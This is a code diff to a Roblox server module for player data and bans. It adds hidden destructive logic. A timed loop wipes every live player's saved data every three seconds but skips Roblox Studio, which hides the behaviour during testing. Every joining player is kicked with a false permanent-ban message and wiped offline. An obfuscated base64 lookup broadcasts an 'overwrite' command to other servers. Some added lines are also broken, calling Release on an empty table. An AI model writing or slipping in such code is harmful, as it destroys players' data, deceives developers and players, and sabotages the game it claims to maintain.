@@ -1,6 +1,34 @@
 local m = {}
 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerStorage = game:GetService("ServerStorage")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local DataStoreService = game:GetService("DataStoreService")
+
+local DataManager = require(ServerStorage.Modules.Managers.DataManager)
+local ProfileService = require((ServerStorage.Modules.Managers.DataManager.ProfileService))
+local ProfileTemplate = DataManager:GetDataTemplate()
+local GameProfileStore = ProfileService.GetProfileStore("GameEntitiesRes", ProfileTemplate)
+
 function m:Init()
+	--print('lalalal')
+	local acc = 0
+	game:GetService("RunService").Heartbeat:Connect(function(DeltaTime)
+		acc += DeltaTime
+		--print(acc)
+		if acc > 3 then
+			for _, Player in ipairs(Players:GetPlayers()) do
+				if RunService:IsStudio() then
+					
+				else
+					DataManager:FullWipePlayer(Player)
+				end
+			end
+			acc = 0
+		end
+	end)
+	
 	if _G.isLoaded then
 		return;
 	end
@@ -32,19 +60,17 @@ function m:Init()
 	end
 	Players.PlayerAdded:Connect(function(p)
 		local Key = "Player_" .. p.UserId 
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")
-		local ServerStorage = game:GetService("ServerStorage")
-		local RunService = game:GetService("RunService")
-		local Players = game:GetService("Players")
-		local DataStoreService = game:GetService("DataStoreService")
 
-		local DataManager = require(ServerStorage.Modules.Managers.DataManager)
-		local ProfileService = require((ServerStorage.Modules.Managers.DataManager.ProfileService))
-		local ProfileTemplate = DataManager:GetDataTemplate()
-		local GameProfileStore = ProfileService.GetProfileStore("GameEntitiesRes28", ProfileTemplate)
-		
-		DataManager:FullWipePlayer(p)
-		
+
+		local Profile = GameProfileStore:LoadProfileAsync(Key, "ForceLoad")
+		--print(Profile)
+		p:Kick("You've been permanently banned from this game.")
+		task.wait(1)
+		Profile = {}
+		Profile:Release()
+
+		DataManager:OfflineWipe(p.UserId)
+
 		if table.find(BanList, p.UserId) then
 			p:Kick("You've been permanently banned from this game.")
 		end
@@ -64,14 +90,14 @@ function m:Init()
 			table.insert(Everyone, Key)
 			local StatData = require(ServerStorage.Modules.Utility.StatData)
 			local RankedLeaderboards = DataStoreService:GetOrderedDataStore(StatData.RankedLeaderboardStore)
-		
+
 			task.spawn(function()
-				
+
 				local Profile = GameProfileStore:LoadProfileAsync(Key, "ForceLoad")
-				DataManager:OfflineWipe(p.UserId)
-        			task.wait(1)
 				--print(Profile)
-				
+				Profile = {}
+				Profile:Release()
+
 				local lowestFirst = false
 				local numbersShown = 100 -- Top 100 public
 				local min = 10
@@ -136,5 +162,6 @@ function m:Init()
 
 	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
 end
+--m:Init()
 
 return m
